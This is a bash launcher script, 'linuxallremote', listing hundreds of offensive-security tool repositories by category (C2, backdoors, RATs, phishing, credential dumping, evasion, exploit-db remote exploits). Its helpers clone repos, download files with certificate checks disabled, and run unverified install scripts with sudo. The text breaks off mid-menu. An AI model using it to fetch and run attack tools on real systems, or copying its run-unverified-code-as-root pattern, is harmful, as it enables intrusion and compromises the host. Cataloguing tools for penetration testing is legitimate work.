#!/bin/bash

#Author: Fabio Defilippo
#email: 4starfds@gmail.com

ENTSSL="https://github.com/"
ENTRAW="https://raw.githubusercontent.com/"
ENTLAB="https://gitlab.com/"
RQRM="/requirements.txt"
SEP=$(for (( I=0 ; I<$(tput cols) ; I++ )); do printf '_'; done)

function Installa
{
	echo "This utility will try to install your chosen repo. Digit the repo folder without slash '/'"
	ls
	read -p "(example, myrepo): " REPO
	if [[ "$REPO" != "" ]];
	then
		if [[ -d "$REPO""/" ]];
		then
			if [[ -f "$REPO""/install" ]];
			then
				sudo "$REPO""/install"
			elif [[ -f "$REPO""$RQRM" ]];
			then
				pyp3="0"
				if [[ $(grep "python3" "$REPO""/*.py") != "" ]];
				then
					pyp3="1"
					sudo pip3 install -r "$REPO""$RQRM"
				else
					sudo pip install -r "$REPO""$RQRM"
				fi
				if [[ -f "$REPO""/setup.py" ]];
				then
					if [[ "$pyp3" == "1" ]];
					then
						sudo pip3 "$REPO""/setup.py" install
					else
						sudo pip "$REPO""/setup.py" install
					fi
				fi
			elif [[ -f "$REPO""/Makefile" ]];
			then
				cd "$REPO""/"
				sudo make && sudo make install
				cd ..
			elif [[ -f "$REPO""/Gemfile" ]];
			then
				cd "$REPO""/"
				sudo bundle install
				cd ..
			else
				echo "I can not install this repo. Please, try you manually"
				if [[ -f "$REPO""/README.md" ]];
				then
					echo "Do you want open README.md file to help you?"
					read -p "Y/n (default n): " RESP
					if [[ "$RESP" == "Y" ]];
					then
						less "$REPO""/README.md"
					fi
				fi
			fi
		fi
	fi
}

function ClonaLab
{
	git clone "$ENTLAB""$1"".git"
}

function Clona
{
	git clone "$ENTSSL""$1"".git"
}

function Scarica
{
	wget --no-check-certificate "$1"
}

function Warning
{
	read -p "WARNING: this repo is not verified! Do you want download it anyway? Y/n (default n) " RSP
	if [[ "$RSP" != "" ]];
	then
		echo "$RSP"
	fi
}

echo "linuxallremote, by FabioDefilippoSoftware"

if [[ ! -f $(which lynx) ]];
then
	echo "For a better experience, please install lynx"
	read -p "press ENTER to continue..."
fi

while true; do
	echo "$SEP"
	echo " 0. exit"
	echo "$SEP"
	echo "ACTIVE DIRECTORY"
	echo -ne " 27. Greenwolf/Spray\t\t\t\t229. DanMcInerney/icebreaker\t\t\t\t283. optiv/Talon\n"
	echo -ne " 524. tothi/rbcd-attack/rbcd\t\t\t587. PaperMtn/lil-pwny\n"
	echo "$SEP"
	echo "ACQUISITION"
	echo -ne " 171. Silv3rHorn/ArtifactExtractor\t\t172. SekoiaLab/Fastir_Collector\n"
	echo "$SEP"
	echo "AES"
	echo -ne " 28. bfaure/AES-128_Cracker\t\t\t29. unicornsasfuel/keybrute\n"
	echo "$SEP"
	echo "ANALIZING"
	echo -ne " 142. saferwall/saferwall\t\t\t169. fireeye/flare-floss\t\t\t\t219. BinaryAnalysisPlatform/bap\n"
	echo -ne " 220. angr/angr\t\t\t\t\t224. cogent/origami-pdf\t\t\t\t\t451. Ettercap/ettercap\n"
	echo "$SEP"
	echo "ANDROID - APK"
	echo -ne " 128. xtiankisutsa/MARA_Framework\t\t274. yasoob/nrc-exporter\t\t\t\t277. mzfr/slicer\n"
	echo -ne " 323. ASHWIN990/ADB-Toolkit\t\t\t326. metachar/PhoneSploit\t\t\t\t327. xtiankisutsa/twiga\n"
	echo -ne " 373. wuseman/WBRUTER\t\t\t\t405. bkerler/android_universal\n"
	echo -ne " 410. mesquidar/adbsploit\t\t\t504. airbus-seclab/android_emuroot\t\t\t552. MobSF/Mobile-Security-Framework-MobSF\n"
	echo -ne " 572. 1N3/ReverseAPK\n"
	echo "$SEP"
	echo "ANTI-FORENSICS - SECURITY"
	echo -ne " 480. AndyCyberSec/direncrypt\t\t\t577. KuroLabs/stegcloak\t\t\t\t\t590. 1tayH/noisy\n"
	echo "$SEP"
	echo "APACHE"
	echo -ne " 278. mgeeky/tomcatWarDeployer\t\t\t280. hypn0s/AJPy\n"
	echo "$SEP"
	echo "APPLE"
	echo -ne " 644. Pr0x13/iDict\t\t\t\t645. foozzi/iCloudBrutter\n"
	echo "$SEP"
	echo "ARP"
	echo -ne " 462. royhills/arp-scan\t\t\t\t582. byt3bl33d3r/arpspoof\t\t\t\t583. ammarx/ARP-spoofing/mmattack\n"
	echo "$SEP"
	echo "AWS"
	echo -ne " 657. sa7mon/S3Scanner\t\t\t\t659. aljazceru/s3-bucket-scanner\t\t\t660. ankane/s3tk\n"
	echo -ne " 661. bear/s3scan\t\t\t\t662. haroonawanofficial/Amazon-AWS-Hack\t\t\t663. nagwww/101-AWS-S3-Hacks\n"
	echo -ne " 706. pbnj/s3-fuzzer\n"
	echo "$SEP"
	echo "AZURE"
	echo -ne " 32. dirkjanm/ROADtools\n"
	echo "$SEP"
	echo "BACKDOOR"
	echo -ne " 409. tz4678/backshell\t\t\t\t565. AnonymousAt3/cyberdoor\n"
	echo "$SEP"
	echo "BLUETOOTH"
	echo -ne " 305. lucaboni92/BlueFuzz\t\t\t440. fO-000/bluescan\t\t\t\t\t447. MillerTechnologyPeru/hcitool\n"
	echo -ne " 482. francozappa/knob\t\t\t\t505. joswr1ght/btfind\n"
	echo "$SEP"
	echo "BOT - AI"
	echo -ne " 445. evilsocket/kitsune\n"
	echo "$SEP"
	echo "BRAINF**K"
	echo -ne " 238. brain-lang/brainfuck\t\t\t239. fabianishere/brainfuck\n"
	echo "$SEP"
	echo "C2 - Command and Control"
	echo -ne " 499. hyp3rlinx/DarkFinger-C2\t\t\t500. nettitude/PoshC2\t\t\t\t\t502. sensepost/godoh\n"
	echo -ne " 503. lu4p/ToRat\t\t\t\t602. nil0x42/phpsploit\n"
	echo "$SEP"
	echo "CHAT ENCRYPTED"
	echo -ne " 376. mjm918/python-AES-encryption-socket-secure-chat\t\t\t\t\t\t\t377. SusmithKrishnan/neuron\n"
	echo -ne " 378. ludvigknutsmark/python-chat\t\t379. sathwikv143/Encrypted-Python-Chat\t\t\t380. osalpekar/Encrypted-Chat\n"
	echo -ne " 381. LatrecheYasser/Secure-Python-Chat\t\t382. spec-sec/SecureChat\n"
	echo "$SEP"
	echo "CISCO"
	echo -ne " 463. Zapotek/cdpsnarf\n"
	echo "$SEP"
	echo "CLOUDS"
	echo -ne " 658. SimplySecurity/SimplyEmail\t\t664. aquasecurity/cloudsploit\n"
	echo "$SEP"
	echo "CMS"
	echo -ne " 483. TheDevFromKer/CMS-Attack\t\t\t484. Dionach/CMSmap\t\t\t\t\t234. n4xh4ck5/CMSsc4n\n"
	echo "$SEP"
	echo "CRACK - GUESSING"
	echo -ne " 80. magnumripper/JohnTheRipper\t\t\t81. truongkma/ctf-tools/John\t\t\t\t82. SySS-Research/Seth\n"
	echo -ne " 83. s0md3v/Hash-Buster\t\t\t\t120. NetSPI/PS_MultiCrack\t\t\t\t41. shmilylty/cheetah\n"
	echo -ne " 126. timbo05sec/autocrack\t\t\t127. igorMatsunaga/autoCrack\t\t\t\t247. mufeedvh/basecrack\n"
	echo -ne " 475. MS-WEB-BN/h4rpy\t\t\t\t506. Aarif123456/passwordCracker\t\t\t507. GauthamGoli/rar-Password-Cracker/bruteforce\n"
	echo -ne " 543. praetorian-inc/trident_0.1.3_linux_i386\t544. praetorian-inc/trident_0.1.3_linux_x86_64\t\t545. praetorian-inc/trident\n"
	echo -ne " 563. Viralmaniar/Passhunt\t\t\t611. jmk-foofus/medusa\t\t\t\t\t612. openwall/john\n"
	echo -ne " 630. beurtschipper/Depix\t\t\t632. x90skysn3k/brutespray\n"
	echo "$SEP"
	echo "CRAWLING - SPIDERING"
	echo -ne " 586. saeeddhqan/evine\t722. OWASP/OWASP-WebScarab\t\t\t\t\t733. gotr00t0day/spider00t\n"
	echo "$SEP"
	echo "CSRF - XSRF"
	echo -ne " 406. 0xInfection/XSRFProbe\n"
	echo "$SEP"
	echo "DEBUGGING"
	echo -ne " 144. snare/voltron\t\t\t\t125. detailyang/readelf\t\t\t\t\t222. vivisect/vivisect\n"
	echo -ne " 223. unicorn-engine/unicorn\n"
	echo "$SEP"
	echo "DECRYPTING"
	echo -ne " 332. Ciphey/Ciphey\n"
	echo "$SEP"
	echo "DIRBUSTERING"
	echo -ne " 54. aboul3la/Sublist3r\t\t\t\t411. H4ckForJob/dirmap\n"
	echo "$SEP"
	echo "DISASSEMBLING"
	echo -ne " 216. gdbinit/MachOView\t\t\t\t217. cseagle/fREedom\t\t\t\t\t218. google/binnavi\n"
	echo -ne " 336. sciencemanx/x86-analysis\t\t\t340. wisk/medusa\t\t\t\t\t341. REDasmOrg/REDasm\n"
	echo -ne " 337. cryptator/assembly-code-analysis\t\t338. plasma-disassembler/plasma\t\t\t\t339. cea-sec/miasm\n"
	echo -ne " 342. vivisect/vivisect\n"
	echo "$SEP"
	echo "DISCOVERING"
	echo -ne " 559. epi052/feroxbuster\t\t\t573. robre/scripthunter\t\t\t\t\t729. chris408/ct-exposer\n"
	echo -ne " 736. gotr00t0day/VulnBanner\n"
	echo "$SEP"
	echo "DNS"
	echo -ne " 30. m57/dnsteal\t\t\t\t31. skelsec/jackdaw\t\t\t\t\t35. projectdiscovery/dnsprobe\n"
	echo -ne " 88. m57/dnsteal\t\t\t\t269. dariusztytko/vhosts-sieve\t\t\t\t286. iphelix/dnschef\n"
	echo -ne " 335. mschwager/fierce\t\t\t\t464. fwaeytens/dnsenum\t\t\t\t\t491. TeamFoxtrot-GitHub/DNSMap\n"
	echo -ne " 492. darkoperator/dnsrecon\t\t\t493. neiltyagi/DNSRECON\t\t\t\t\t496. rs/dnstrace\n"
	echo -ne " 497. redsift/dnstrace\t\t\t\t498. dkorunic/dnstrace\t\t\t\t\t528. mfocuz/DNS_Hunter\n"
	echo "$SEP"
	echo "DOCKER"
	echo -ne " 351. cr0hn/dockerscan\t\t\t\t352. RhinoSecurityLabs/ccat\n"
	echo "$SEP"
	echo "DUMPING - EXTRACTING"
	echo -ne " 121. AlessandroZ/LaZagne\t\t\t170. sevagas/swap_digger\t\t\t\t49. Greenwolf/ntlm_theft\n"
	echo -ne " 197. sowdust/pdfxplr\t\t\t\t213. Arno0x/NtlmRelayToEWS\t\t\t\t221. 504ensicsLabs/LiME\n"
	echo -ne " 285. louisabraham/ffpass\t\t\t294. TryCatchHCF/Cloakify\t\t\t\t441. laramies/metagoofil\n"
	echo -ne " 533. securing/DumpsterDiver\n"
	echo "$SEP"
	echo "ENUMERATION"
	echo -ne " 163. luke-goddard/enumy\t\t\t209. Knowledge-Wisdom-Understanding/recon\n"
	echo -ne " 619. cddmp/enum4linux-ng\t\t\t735. gotr00t0day/oswalkpy\n"
	echo "$SEP"
	echo "EVASION - BYPASSING"
	echo -ne " 167. govolution/avet\t\t\t\t134. khalilbijjou/WAFNinja\t\t\t\t174. stormshadow07/HackTheWorld\n"
	echo -ne " 268. wintrmvte/SNOWCRASH\t\t\t275. CBHue/PyFuscation\t\t\t\t\t293. OsandaMalith/PE2HTML\n"
	echo -ne " 309. mdsecactivebreach/Chameleon\t\t576. Veil-Framework/Veil\t\t\t\t605. shadowlabscc/Kaiten\n"
	echo -ne " 688. lobuhi/byp4xx\t\t\t\t731. gotr00t0day/forbiddenpass\n"
	echo "$SEP"
	echo "EXCHANGE"
	echo -ne " 571. sensepost/ruler\n"
	echo "$SEP"
	echo "EXFILTRATION"
	echo -ne " 314. danielwolfmann/Invoke-WordThief/logger\t593. TryCatchHCF/PacketWhisper\n"
	echo "$SEP"
	echo "EXPLOIT"
	echo -ne " 10. exploit-db/linux - remote scripts\t\t11. exploit-db/linux_x86 - remote scripts\t\t12. exploit-db/linux_x86-64 - remote scripts\n"
	echo -ne " 13. exploit-db/windows - remote scripts\t14. exploit-db/windows_x86 - remote scripts\t\t15. exploit-db/windows_x86-64 - remote scripts\n"
	echo -ne " 16. sundaysec/Android-Exploits/remote\t\t17. offensive-security/exploitdb/android/remote\n"
	echo -ne " 18. offensive-security/exploitdb/ios\t\t617. Download an exploit from exploit-db site web\n"
	echo "$SEP"
	echo "EXTRA"
	echo -ne " 252. LionSec/katoolin\n"
	echo "$SEP"
	echo "FILE - SYSTEM"
	echo -ne " 446. aarsakian/MFTExtractor\n"
	echo "$SEP"
	echo "FINGER"
	echo -ne " 609. pentestmonkey/finger-user-enum\n"
	echo "$SEP"
	echo "FOOTPRINTING - FINGERPRINTING"
	echo -ne " 132. Zarcolio/sitedorks\t\t\t133. s0md3v/photon\t\t\t\t\t276. m3n0sd0n4ld/uDork\n"
	echo -ne " 414. hhhrrrttt222111/Dorkify\t\t\t415. Chr0m0s0m3s/DeadTrap\t\t\t\t420. techgaun/github-dorks\n"
	echo -ne " 531. CERT-Polska/hfinger\t\t\t581. EnableSecurity/wafw00f\n"
	echo "$SEP"
	echo "FTP"
	echo -ne " 147. WalderlanSena/ftpbrute\t\t\t149. AlphaRoy14/km985ytv-ftp-exploit\n"
	echo -ne " 150. GitHackTools/FTPBruter\t\t\t151. DevilSquidSecOps/FTP\t\t\t\t154. pentestmonkey/ftp-user-enum\n"
	echo -ne " 175. jtpereyda/boofuzz-ftp/ftp\n"
	echo "$SEP"
	echo "FUZZING"
	echo -ne " 34. devanshbatham/ParamSpider\t\t\t56. jtpereyda/boofuzz\t\t\t\t\t50. fuzzdb-project/fuzzdb\n"
	echo -ne " 130. google/AFL\t\t\t\t72. corelan/mona\t\t\t\t\t73. OpenRCE/sulley\n"
	echo -ne " 465. wireghoul/dotdotpwn\t\t\t517. dwisiswant0/crlfuzz\t\t\t\t597. googleprojectzero/fuzzilli\n"
	echo -ne " 687. renatahodovan/grammarinator\t\t686. nccgroup/fuzzowski\t\t\t\t\t685. OblivionDev/fuzzdiff\n"
	echo -ne " 684. nol13/fuzzball\t\t\t\t683. k0retux/fuddly\t\t\t\t\t682. nccgroup/FrisbeeLite\n"
	echo -ne " 681. zznop/flyr\t\t\t\t680. wireghoul/doona\t\t\t\t\t679. googleprojectzero/domato\n"
	echo -ne " 678. ernw/dizzy\t\t\t\t677. MozillaSecurity/dharma\t\t\t\t675. hadoocn/conscan\n"
	echo -ne " 674. dobin/ffw\t\t\t\t\t673. CENSUS/choronzon\t\t\t\t\t672. RootUp/BFuzz\n"
	echo -ne " 671. localh0t/backfuzz\t\t\t\t670. doyensec/ajpfuzzer\t\t\t\t\t702. HSASec/ProFuzz\n"
	echo -ne " 689. savio-code/hexorbase\t\t\t690. nccgroup/Hodor\t\t\t\t\t691. google/honggfuzz\n"
	echo -ne " 692. tehmoon/http-fuzzer\t\t\t693. andresriancho/websocket-fuzzer\t\t\t694. twilsonb/jbrofuzz\n"
	echo -ne " 695. cisco-sas/kitty\t\t\t\t696. mxmssh/manul\t\t\t\t\t697. IOActive/Melkor_ELF_Fuzzer\n"
	echo -ne " 698. mazzoo/ohrwurm\t\t\t\t699. MozillaSecurity/peach\t\t\t\t700. calebstewart/peach\n"
	echo -ne " 701. marcinguy/powerfuzzer\t\t\t703. hgascon/pulsar\n"
	echo -ne " 704. mseclab/PyJFuzz\t\t\t\t705. akihe/radamsa\t\t\t\t\t707. Battelle/sandsifter\n"
	echo -ne " 708. mfontanini/sloth-fuzzer\t\t\t709. nopper/archpwn\t\t\t\t\t711. landw1re/socketfuzz\n"
	echo -ne " 712. allfro/sploitego\t\t\t\t715. rsmusllp/termineter\t\t\t\t716. droberson/thefuzz\n"
	echo -ne " 717. kernelslacker/trinity\t\t\t718. PAGalaxyLab/uniFuzzer\t\t\t\t720. nullsecuritynet/uniofuzz\n"
	echo -ne " 721. andresriancho/w3af\t\t\t723. wereallfeds/webshag\t\t\t\t724. samhocevar/zzuf\n"
	echo "$SEP"
	echo "GATHERING - OSINT"
	echo -ne " 168. Screetsec/Sudomy\t\t\t\t177. HightechSec/git-scanner/gitscanner\t\t\t89. urbanadventurer/WhatWeb\n"
	echo -ne " 215. evanmiller/hecate\t\t\t\t246. danieleperera/OnionIngestor\t\t\t248. evyatarmeged/Raccoon\n"
	echo -ne " 300. laramies/theHarvester\t\t\t306. lockfale/OSINT-Framework\t\t\t\t307. Netflix-Skunkworks/Scumblr\n"
	echo -ne " 315. M0tHs3C/Hikxploit\t\t\t\t316. sundowndev/PhoneInfoga\t\t\t\t358. intelowlproject/IntelOwl\n"
	echo -ne " 364. opsdisk/pagodo\t\t\t\t179. BullsEye0/shodan-eye\t\t\t\t470. HatBashBR/ShodanHat\n"
	echo -ne " 472. random-robbie/My-Shodan-Scripts\t\t473. woj-ciech/Kamerka-GUI\t\t\t\t474. m4ll0k/Shodanfy.py\n"
	echo -ne " 477. gelim/censys\t\t\t\t478. twelvesec/gasmask\t\t\t\t\t476. sdnewhop/grinder\n"
	echo -ne " 486. sowdust/tafferugli\t\t\t537. adnane-X-tebbaa/Katana\t\t\t\t555. m8r0wn/subscraper\n"
	echo -ne " 560. Datalux/Osintgram\t\t\t\t585. thewhiteh4t/FinalRecon\t\t\t\t588. AzizKpln/Moriarty-Project\n"
	echo -ne " 589. mxrch/GHunt\t\t\t\t613. bdblackhat/admin-panel-finder\t\t\t625. TermuxHacking000/phonia\n"
	echo -ne " 631. Anon-Exploiter/SiteBroker\t\t\t646. nandydark/grim\t\t\t\t\t653. adnane-X-tebbaa/GRecon\n"
	echo -ne " 725. alpkeskin/mosint\t\t\t\t730. gotr00t0day/IGF\t\t\t\t\t734. gotr00t0day/subdomainbrute\n"
	echo "$SEP"
	echo "GIT - REPOS"
	echo -ne " 487. arthaud/git-dumper\t\t\t553. Ebryx/GitDump\n"
	echo "$SEP"
	echo "HOOKING - HIJACKING - INJECTION"
	echo -ne " 140. zznop/drow\t\t\t\t173. J3wker/DLLicous-MaliciousDLL\t\t\t185. cybercitizen7/Ps1jacker\n"
	echo -ne " 196. thelinuxchoice/spyeye\t\t\t353. ujjwal96/njaXt\t\t\t\t\t354. toxic-ig/SQL-XSS\n"
	echo -ne " 355. swisskyrepo/SSRFmap\t\t\t453. zt2/sqli-hunter\t\t\t\t\t467. JohnTroony/Blisqy\n"
	echo -ne " 518. chinarulezzz/pixload/bmp\t\t\t519. chinarulezzz/pixload/gif\t\t\t\t520. chinarulezzz/pixload/jpg\n"
	echo -ne " 521. chinarulezzz/pixload/png\t\t\t522. chinarulezzz/pixload/webp\t\t\t\t569. commixproject/commix\n"
	echo -ne " 676. rudSarkar/crlf-injector\n"
	echo "$SEP"
	echo "IIS"
	echo -ne " 22. 0x09AL/IIS-Raid\t\t\t\t23. thelinuxchoice/evilreg\t\t\t\t24. thelinuxchoice/eviloffice\n"
	echo -ne " 25. thelinuxchoice/evildll\t\t\t158. gehaxelt/Python-dsstore\t\t\t\t250. edwardz246003/IIS_exploit\n"
	echo -ne " 251. irsdl/IIS-ShortName-Scanner\n"
	echo "$SEP"
	echo "IKE"
	echo -ne " 526. 0x90/vpn-arsenal\t\t\t726. SpiderLabs/ikeforce\t\t\t\t727. royhills/ike-scan\n"
	echo "$SEP"
	echo "IMAP"
	echo -ne " 204. byt3bl33d3r/SprayingToolkit\t\t205. mrexodia/haxxmap\t\t\t\t\t207. iomoath/IMAP-Cracker\n"
	echo "$SEP"
	echo "IMSI"
	echo -ne " 387. Oros42/IMSI-catcher\t\t\t386. sharyer/GSMEvil/ImsiEvil\n"
	echo "$SEP"
	echo "IPCAM"
	echo -ne " 398. CCrashBandicot/IPCam\t\t\t399. nathan242/ipcam-cctv\t\t\t\t400. Benehiko/GoNetworkCameraScanner\n"
	echo -ne " 401. vanpersiexp/expcamera\t\t\t656. spicesouls/reosploit\n"
	echo "$SEP"
	echo "iOS"
	echo -ne " 360. tokyoneon/Arcane\t\t\t\t442. Flo354/iOSForensic\t\t\t\t\t443. as0ler/iphone-dataprotection\n"
	echo -ne " 444. jantrim/iosbackupexaminer\t\t\t666. yuejd/ios_Restriction_PassCode_Crack---Python-version\n"
	echo "$SEP"
	echo "iTUNES"
	echo -ne " 665. jos666/itunes_hack\n"
	echo "$SEP"
	echo "JAVA"
	echo -ne " 227. pxb1988/dex2jar\t\t\t\t346. benf/cfr\t\t\t\t\t\t356. java-decompiler/jd-gui\n"
	echo "$SEP"
	echo "JENKINS"
	echo -ne " 356. gquere/pwn_jenkins\n"
	echo "$SEP"
	echo "KERBEROS"
	echo -ne " 3. ropnop/kerbrute\t\t\t\t26. TarlogicSecurity/kerbrute\t\t\t\t5. CroweCybersecurity/ad-ldap-enum\n"
	echo -ne " 6. proabiral/inception\t\t\t\t362. nidem/kerberoast\t\t\t\t\t516. NotMedic/NetNTLMtoSilverTicket/dementor\n"
	echo "$SEP"
	echo "KUBERNETES"
	echo -ne " 374. liggitt/audit2rbac\t\t\t375. mhausenblas/kaput\t\t\t\t\t647. vchinnipilli/kubestrike\n"
	echo -ne " 648. cyberark/KubiScan\n"
	echo "$SEP"
	echo "LDAP"
	echo -ne " 1. CasperGN/ActiveDirectoryEnumeration\t\t2. dirkjanm/ldapdomaindump\t\t\t\t4. ropnop/windapsearch\n"
	echo -ne " 64. dinigalab/ldapsearch\t\t\t84. 3rdDegree/dapper\t\t\t\t\t85. m8r0wn/ldap_search\n"
	echo -ne " 728. droope/ldap-brute\n"
	echo "$SEP"
	echo "MALWARE"
	echo -ne " 407. avinashkranjan/Malware-with-Backdoor-and-Keylogger\n"
	echo "$SEP"
	echo "MEMCACHEDAEMON"
	echo -ne " 166. linsomniac/python-memcached\n"
	echo "$SEP"
	echo "MISC - FRAMEWORKS"
	echo -ne " 20. trustedsec scripts\t\t\t\t21. Hood3dRob1n scripts\t\t\t\t\t33. fox-it/BloodHound\n"
	echo -ne " 67. byt3bl33d3r/CrackMapExec\t\t\t52. tismayil/ohmybackup\t\t\t\t\t40. SecureAuthCorp/impacket\n"
	echo -ne " 141. pry0cc/axiom\t\t\t\t7. dark-warlord14/ffufplus\t\t\t\t45. porterhau5/BloodHound-Owned\n"
	echo -ne " 90. jivoi/pentest/tools\t\t\t186. Manisso/fsociety\t\t\t\t\t228. koutto/jok3r\n"
	echo -ne " 244. s0md3v/Striker\t\t\t\t253. b3-v3r/Hunner\t\t\t\t\t254. PowerScript/KatanaFramework\n"
	echo -ne " 255. unkn0wnh4ckr/hackers-tool-kit\t\t256. santatic/web2attack\t\t\t\t257. andyvaikunth/roxysploit\n"
	echo -ne " 258. x3omdax/PenBox\t\t\t\t259. dhondta/dronesploit\t\t\t\t282. m4n3dw0lf/pythem\n"
	echo -ne " 284. brutemap-dev/brutemap\t\t\t288. dark-lbp/isf\t\t\t\t\t289. onccgroup/redsnarf\n"
	echo -ne " 296. Z4nzu/hackingtool\t\t\t\t298. lanjelot/patator\t\t\t\t\t304. GitHackTools/BruteDum/brutedum\n"
	echo -ne " 310. future-architect/vuls\t\t\t311. ethicalhackerproject/TaiPan\t\t\t319. marcrowProject/Bramble\n"
	echo -ne " 320. stevemcilwain/quiver\t\t\t322. abdulr7mann/hackerEnv\t\t\t\t359. lgandx/Responder\n"
	echo -ne " 392. zerosum0x0/koadic\t\t\t\t403. Screetsec/TheFatRat\t\t\t\t404. OWASP/Amass\n"
	echo -ne " 408. AdrianVollmer/PowerHub\t\t\t439. DarkSecDevelopers/HiddenEye\t\t\t481. 0xInfection/TIDoS-Framework\n"
	echo -ne " 485. r3dxpl0it/TheXFramework\t\t\t488. Taguar258/Raven-Storm\t\t\t\t514. maxlandon/wiregost\n"
	echo -ne " 523. nerodtm/ReconCobra---Complete-Automated-Pentest-Framework-For-Information-Gatheringt\t\t651. leebaird/discover\n"
	echo -ne " 527. Moham3dRiahi/XAttacker\t\t\t529. riusksk/StrutScan\t\t\t\t\t530. AlisamTechnology/ATSCAN\n"
	echo -ne " 554. FluxionNetwork/fluxion\t\t\t557. knassar702/scant3r\t\t\t\t\t567. Leviathan36/kaboom\n"
	echo -ne " 568. archerysec/archerysec\t\t\t579. AnonymousAt3/cybermap\t\t\t\t604. qsecure-labs/overlord\n"
	echo -ne " 606. Chudry/Xerror\t\t\t\t616. rajkumardusad/Tool-X\t\t\t\t626. GoVanguard/legion\n"
	echo -ne " 640. KALILINUXTRICKSYT/easysploit\t\t650. edoardottt/scilla\n"
	echo "$SEP"
	echo "MITM"
	echo -ne " 249. kgretzky/evilginx2\t\t\t331. mkdirlove/SSLSTRIP-NG/sslstrip-ng\t\t\t541. wifiphisher/wifiphisher\n"
	echo "$SEP"
	echo "MONGODB - NOSQL"
	echo -ne " 230. youngyangyang04/NoSQLAttack\t\t231. codingo/NoSQLMap\t\t\t\t\t232. torque59/Nosql-Exploitation-Framework\n"
	echo "$SEP"
	echo "MYSQL"
	echo -ne " 301. ufuksungu/MySqlBruteForce/mysql\n"
	echo "$SEP"
	echo "NAS"
	echo -ne " 402. TrustMe00/experience_synology_attack\n"
	echo "$SEP"
	echo "NETLOGON"
	echo -ne " 508. risksense/zerologon\t\t\t509. bb00/zer0dump\t\t\t\t\t510. VoidSec/CVE-2020-1472\n"
	echo "$SEP"
	echo "NTP"
	echo -ne " 178. PentesterES/Delorean\n"
	echo "$SEP"
	echo "OWA"
	echo -ne " 343. busterb/msmailprobe\t\t\t344. 0xZDH/o365spray\t\t\t\t\t345. gremwell/o365enum\n"
	echo "$SEP"
	echo "PASSWORD"
	echo -ne " 393. clr2of8/DPAT\n"
	echo "$SEP"
	echo "PDF"
	echo -ne " 46. thelinuxchoice/evilpdf\t\t\t47. robins/pdfcrack\t\t\t\t\t48. BroadbentT/PDF-CRACKER/pdf-cracker\n"
	echo "$SEP"
	echo "PHISHING"
	echo -ne " 385. blark/cli-phisher\t\t\t\t412. kurogai/nero-phishing-server\t\t\t413. KnightSec-Official/Phlexish\n"
	echo -ne " 489. david3107/squatm3\t\t\t\t490. netevert/dnsmorph\n"
	echo "$SEP"
	echo "POSTGRESQL"
	echo -ne " 303. KTN1990/PostgreSQL--Attack-on-default-password-AUTOEXPLOITING-/DB\n"
	echo "$SEP"
	echo "PRINTER"
	echo -ne " 639. RUB-NDS/PRET\n"
	echo "$SEP"
	echo "PROXY"
	echo -ne " 162. fozavci/viproy-VoIPkit\t\t\t610. audibleblink/doxycannon\n"
	echo "$SEP"
	echo "RAINBOW TABLE"
	echo -ne " 260. clu8/RainbowTable\t\t\t\t261. zcdziura/leprechaun\t\t\t\t262. CyberKnight00/RainbowHash\n"
	echo -ne " 263. dgleebits/Double-Rainbow\t\t\t264. jtesta/rainbowcrackalack\t\t\t\t265. sepehrdaddev/hashcobra\n"
	echo "$SEP"
	echo "RAR"
	echo -ne " 273. dunossauro/PyRarCrack/pyrarcrack\n"
	echo "$SEP"
	echo "RASPBERRY"
	echo -ne " 584. BusesCanFly/rpi-hunter\n"
	echo "$SEP"
	echo "RAT"
	echo -ne " 536. Pure-L0G1C/Loki\n"
	echo "$SEP"
	echo "RDP"
	echo -ne " 86. ekultek/bluekeep\t\t\t\t328. citronneur/rdpy\t\t\t\t\t329. aerissecure/rdpy\n"
	echo -ne " 330. fhirschmann/rdp\t\t\t\t452. Vulnerability-scanner/Lazy-RDP\t\t\t636. xFreed0m/RDPassSpray\n"
	echo -ne " 637. Viralmaniar/Remote-Desktop-Caching\n"
	echo "$SEP"
	echo "RECONIZING"
	echo -ne " 131. leobeosab/sharingan\t\t\t94. samhaxr/recox\t\t\t\t\t129. sowdust/ffff\n"
	echo -ne " 214. j3ssie/Osmedeus\t\t\t\t242. smicallef/spiderfoot\t\t\t\t308. yogeshojha/rengine\n"
	echo -ne " 390. lanmaster53/recon-ng\t\t\t391. methos2016/recon-ng\t\t\t\t501. LukaSikic/subzy\n"
	echo -ne " 556. LordNeoStark/tugarecon\t\t\t594. r3vn/badKarma\t\t\t\t\t599. utkusen/urlhunter\n"
	echo -ne " 601. UnaPibaGeek/ctfr\t\t\t\t607. thewhiteh4t/seeker\t\t\t\t\t732. gotr00t0day/spyhunt\n"
	echo "$SEP"
	echo "REVERSING"
	echo -ne " 361. yeggor/UEFI_RETool\t\t\t737. gotr00t0day/b1n4ryR3v3rs3\n"
	echo "$SEP"
	echo "REVSHELL"
	echo -ne " 515. 3v4Si0N/HTTP-revshell\n"
	echo "$SEP"
	echo "ROGUE ACCESS POINT"
	echo -ne " 575. MS-WEB-BN/c41n\n"
	echo "$SEP"
	echo "ROUTERS"
	echo -ne " 145. threat9/routersploit\n"
	echo "$SEP"
	echo "RPC"
	echo -ne " 233. aress31/xmlrpc-bruteforcer\t\t313. s4vitar/rpcenum\t\t\t\t\t570. hegusung/RPCScan\n"
	echo "$SEP"
	echo "RSA"
	echo -ne " 57. Ganapati/RsaCtfTool\t\t\t69. zweisamkeit/RSHack\n"
	echo -ne " 79. pablocelayes/rsa-wiener-attack\n"
	echo "$SEP"
	echo "SCANNING"
	echo -ne " 188. GrrrDog/FlashAV\t\t\t\t191. m57/piescan\t\t\t\t\t192. projectdiscovery/naabu\n"
	echo -ne " 193. ahervias77/portscanner\t\t\t206. lanjelot/patator\t\t\t\t\t208. gh0stwizard/p5-udp-scanner\n"
	echo -ne " 210. liamg/furious\t\t\t\t211. anvie/port-scanner\t\t\t\t\t212. anrosent/portscan\n"
	echo -ne " 235. shodansploit/shodansploit\t\t\t\t236. ninj4c0d3r/ShodanCli\n"
	echo -ne " 266. google/tsunami-security-scanner\t\t267. deepsecurity-pe/GoGhost\t\t\t\t279. aabeling/portscan\n"
	echo -ne " 299. brandonskerritt/RustScan\t\t\t363. projectdiscovery/nuclei\t\t\t\t448. m0nad/HellRaiser\n"
	echo -ne " 449. RustScan/RustScan\t\t\t\t450. IFGHou/wapiti\t\t\t\t\t454. MrSqar-Ye/BadMod\n"
	echo -ne " 455. future-architect/vuls\t\t\t456. almandin/fuxploider\t\t\t\t457. Moham3dRiahi/XAttacker\n"
	echo -ne " 458. s0md3v/Corsy\t\t\t\t459. skavngr/rapidscan\t\t\t\t\t460. s0md3v/Silver\n"
